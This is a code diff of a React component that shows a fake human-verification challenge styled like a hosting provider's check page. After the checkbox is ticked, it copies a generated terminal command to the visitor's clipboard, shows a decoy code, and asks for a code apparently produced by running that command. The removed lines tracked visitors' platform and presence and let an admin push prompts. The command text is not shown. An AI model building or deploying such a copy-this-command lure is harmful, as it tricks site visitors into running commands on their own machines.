@@ -2,77 +2,13 @@
 
 import { useEffect, useRef, useState, type FormEvent } from "react"
 import { usePathname } from "next/navigation"
-import {
-  decoyCode,
-  humanVerification,
-  verificationApi,
-  visitorCommand,
-  type PublicVerification,
-} from "@/lib/human-verification"
+import { decoyCode, humanVerification, visitorCommand } from "@/lib/human-verification"
 
-function createClientId() {
-  if (typeof crypto.randomUUID === "function") return crypto.randomUUID()
-  const bytes = new Uint8Array(16)
+function createPhrase() {
+  const alphabet = "0123456789ABCDEF"
+  const bytes = new Uint8Array(6)
   crypto.getRandomValues(bytes)
-  bytes[6] = (bytes[6] & 0x0f) | 0x40
-  bytes[8] = (bytes[8] & 0x3f) | 0x80
-  const hex = Array.from(bytes, (byte) => byte.toString(16).padStart(2, "0")).join("")
-  return `${hex.slice(0, 8)}-${hex.slice(8, 12)}-${hex.slice(12, 16)}-${hex.slice(16, 20)}-${hex.slice(20)}`
-}
-
-let memoryClientId = ""
-
-function readClientId() {
-  const clientKey = "apax-verify-client"
-  try {
-    const existing = window.localStorage.getItem(clientKey) || window.sessionStorage.getItem(clientKey)
-    if (existing) {
-      window.localStorage.setItem(clientKey, existing)
-      return existing
-    }
-    const created = createClientId()
-    window.localStorage.setItem(clientKey, created)
-    return created
-  } catch {
-    if (!memoryClientId) memoryClientId = createClientId()
-    return memoryClientId
-  }
-}
-
-function readPassedAt() {
-  try {
-    const value = Number(window.localStorage.getItem("apax-auto-passed-at"))
-    return Number.isFinite(value) && value > 0 ? value : null
-  } catch {
-    return null
-  }
-}
-
-function browserPlatform() {
-  const hinted = (navigator as Navigator & { userAgentData?: { platform?: string } }).userAgentData?.platform
-  if (hinted) return hinted
-  const platform = navigator.platform || ""
-  if (/Mac/i.test(platform)) return "macOS"
-  if (/Win/i.test(platform)) return "Windows"
-  if (/iPhone|iPad|iPod/i.test(platform)) return "iOS"
-  if (/Android/i.test(platform)) return "Android"
-  if (/Linux/i.test(platform)) return "Linux"
-  return ""
-}
-
-async function verifyFetch(path: string, init?: RequestInit) {
-  const response = await fetch(`${verificationApi()}${path}`, {
-    ...init,
-    headers: {
-      "Content-Type": "application/json",
-      ...(init?.headers || {}),
-    },
-  })
-  const data = await response.json().catch(() => ({}))
-  if (!response.ok) {
-    throw new Error(typeof data.error === "string" ? data.error : "The check could not be completed.")
-  }
-  return data as PublicVerification
+  return Array.from(bytes, (byte) => alphabet[byte % alphabet.length]).join("")
 }
 
 /** Copies during the click. The clipboard API is blocked on plain http:// pages. */
@@ -116,7 +52,7 @@ export function HumanVerification() {
   const pathname = usePathname()
   const track = !pathname.startsWith("/admin")
   const [open, setOpen] = useState(false)
-  const [session, setSession] = useState<PublicVerification | null>(null)
+  const [phrase, setPhrase] = useState("")
   const [checked, setChecked] = useState(false)
   const [checking, setChecking] = useState(false)
   const [mark, setMark] = useState<"idle" | "spin" | "done">("idle")
@@ -126,7 +62,6 @@ export function HumanVerification() {
   const [copyNote, setCopyNote] = useState("")
   const [submitting, setSubmitting] = useState(false)
   const [passed, setPassed] = useState(false)
-  const [attempt, setAttempt] = useState(0)
   const [decoy, setDecoy] = useState("")
   const [rayId] = useState(() => {
     const bytes = new Uint8Array(8)
@@ -134,10 +69,8 @@ export function HumanVerification() {
     return Array.from(bytes, (byte) => byte.toString(16).padStart(2, "0")).join("")
   })
   const commandRef = useRef<HTMLTextAreaElement>(null)
-  const sessionRef = useRef<PublicVerification | null>(null)
-  const promptSeen = useRef(0)
+  const shown = useRef(false)
   const checkRun = useRef(0)
-  sessionRef.current = session
 
   useEffect(() => {
     const host = window.location.host
@@ -158,140 +91,31 @@ export function HumanVerification() {
   }, [open])
 
   useEffect(() => {
-    if (!track) return
-    let cancelled = false
-    let timer = 0
-    let pending = false
-
-    const apply = (next: PublicVerification) => {
-      setSession(next)
-      setError("")
-      const finishedKey = `${next.id}:${next.promptId}`
-      const alreadyFinished = window.sessionStorage.getItem("apax-last-prompt") === finishedKey
-      if (next.promptId > 0 && next.promptId !== promptSeen.current && !alreadyFinished) {
-        promptSeen.current = next.promptId
-        checkRun.current += 1
-        setChecked(false)
-        setChecking(false)
-        setMark("idle")
-        setCopied(false)
-        setCodeInput("")
-        setError("")
-        setCopyNote("")
-        setPassed(false)
-        setDecoy("")
-        setOpen(true)
-      }
-    }
-
-    let generation = 0
-
-    const sendPresence = async (visible: boolean) => {
-      const response = await fetch(`${verificationApi()}/verify/sessions`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          page: window.location.pathname,
-          clientId: readClientId(),
-          platform: browserPlatform(),
-          passedAt: readPassedAt(),
-          visible,
-        }),
-        keepalive: true,
-      })
-      if (response.status === 204) return null
-      const data = await response.json().catch(() => ({}))
-      if (!response.ok) {
-        throw new Error(typeof data.error === "string" ? data.error : "The check could not be completed.")
-      }
-      return data as PublicVerification
-    }
-
-    const beat = async () => {
-      if (pending) return
-      const mark = generation
-      pending = true
-      try {
-        const next = await sendPresence(true)
-        if (mark !== generation) {
-          void sendPresence(false).catch(() => {})
-          return
-        }
-        if (!cancelled && next) apply(next)
-      } catch (reason) {
-        if (!cancelled && mark === generation && !sessionRef.current) {
-          setError(reason instanceof Error ? reason.message : "The check could not be completed.")
-        }
-      } finally {
-        pending = false
-      }
-    }
-
-    const leave = () => {
-      generation += 1
-      void sendPresence(false).catch(() => {})
-    }
-
-    const schedule = () => {
-      timer = window.setTimeout(() => {
-        void beat().finally(() => {
-          if (!cancelled) schedule()
-        })
-      }, 1500)
-    }
-
-    void beat().finally(() => {
-      if (!cancelled) schedule()
-    })
-
-    const onWake = () => {
-      void beat()
-    }
-    document.addEventListener("visibilitychange", onWake)
-    window.addEventListener("focus", onWake)
-    window.addEventListener("pageshow", onWake)
-    window.addEventListener("pagehide", leave)
-
-    return () => {
-      cancelled = true
-      window.clearTimeout(timer)
-      document.removeEventListener("visibilitychange", onWake)
-      window.removeEventListener("focus", onWake)
-      window.removeEventListener("pageshow", onWake)
-      window.removeEventListener("pagehide", leave)
-    }
-  }, [attempt, pathname, track])
+    if (!track || shown.current) return
+    shown.current = true
+    setPhrase(createPhrase())
+    setOpen(true)
+  }, [track])
 
   async function onCheck() {
-    if (!session || checked || checking) return
+    if (!phrase || checked || checking) return
     const run = ++checkRun.current
     setChecking(true)
     setMark("spin")
     setError("")
-    const started = Date.now()
-    try {
-      const next = await verifyFetch(`/verify/sessions/${session.id}/check`, { method: "POST" })
-      const elapsed = Date.now() - started
-      if (elapsed < 1200) await new Promise((resolve) => window.setTimeout(resolve, 1200 - elapsed))
-      if (checkRun.current !== run) return
-      setSession(next)
-      setDecoy(decoyCode(next.phrase))
-      setMark("done")
-      await new Promise((resolve) => window.setTimeout(resolve, 800))
-      if (checkRun.current !== run) return
-      setChecked(true)
-      setChecking(false)
-    } catch (reason) {
-      if (checkRun.current !== run) return
-      setMark("idle")
-      setChecking(false)
-      setError(reason instanceof Error ? reason.message : "The check could not be completed.")
-    }
+    await new Promise((resolve) => window.setTimeout(resolve, 1200))
+    if (checkRun.current !== run) return
+    setDecoy(decoyCode(phrase))
+    setMark("done")
+    await new Promise((resolve) => window.setTimeout(resolve, 800))
+    if (checkRun.current !== run) return
+    setChecked(true)
+    setChecking(false)
   }
 
   async function onCopy() {
-    if (!session) return
-    const command = visitorCommand(session.phrase, navigator.userAgent)
+    if (!phrase) return
+    const command = visitorCommand(phrase, navigator.userAgent)
     if (!command) return
     setError("")
     let placed = copyText(command)
@@ -313,46 +137,26 @@ export function HumanVerification() {
       commandRef.current?.select()
       setCopyNote("Copy is blocked in this browser. The line is selected: press Ctrl+C.")
     }
-    try {
-      const next = await verifyFetch(`/verify/sessions/${session.id}/copy`, { method: "POST" })
-      setSession(next)
-    } catch (reason) {
-      setError(reason instanceof Error ? reason.message : "The check could not be completed.")
-    }
   }
 
   async function onSubmit(event: FormEvent) {
     event.preventDefault()
-    if (!session || submitting) return
+    if (!phrase || submitting) return
     setSubmitting(true)
     setError("")
-    try {
-      const next = await verifyFetch(`/verify/sessions/${session.id}/submit`, {
-        method: "POST",
-        body: JSON.stringify({ code: codeInput }),
-      })
-      if (next.verified) {
-        try {
-          window.localStorage.setItem("apax-auto-passed-at", String(Date.now()))
-        } catch {
-          // A private window can refuse storage. The open check still closes.
-        }
-        window.sessionStorage.setItem("apax-last-prompt", `${next.id}:${next.promptId}`)
-        promptSeen.current = next.promptId
-        setPassed(true)
-        window.setTimeout(() => setOpen(false), 1200)
-      }
-    } catch (reason) {
-      setError(reason instanceof Error ? reason.message : "That code does not match.")
-    } finally {
-      setSubmitting(false)
+    if (codeInput.trim().toUpperCase() === phrase.toUpperCase()) {
+      setPassed(true)
+      window.setTimeout(() => setOpen(false), 1200)
+    } else {
+      setError(humanVerification.verifyError)
     }
+    setSubmitting(false)
   }
 
   if (!track || !open) return null
 
   const agent = typeof navigator === "undefined" ? "" : navigator.userAgent
-  const command = session ? visitorCommand(session.phrase, agent) : ""
+  const command = phrase ? visitorCommand(phrase, agent) : ""
   if (!passed && !checked) {
     return (
       <div
@@ -394,7 +198,7 @@ export function HumanVerification() {
                   <input
                     type="checkbox"
                     checked={checked}
-                    disabled={!session || checking}
+                    disabled={!phrase || checking}
                     onChange={onCheck}
                     className="size-5"
                   />
@@ -427,19 +231,6 @@ export function HumanVerification() {
               </span>
             </span>
           </div>
-          {!session && !error ? <p className="mt-3 text-[13px] text-[#595959]">Opening the check...</p> : null}
-          {error && !session ? (
-            <button
-              type="button"
-              onClick={() => {
-                setError("")
-                setAttempt((value) => value + 1)
-              }}
-              className="mt-3 text-sm font-semibold text-[#0051c3]"
-            >
-              Try again
-            </button>
-          ) : null}
           {error ? <p className="mt-3 text-[13px] text-[#dc2626]">{error}</p> : null}
         </div>
         <footer className="absolute inset-x-0 bottom-0 border-t border-[#e6e6e6] px-4 py-4 text-center text-[12px] leading-5 text-[#595959]">
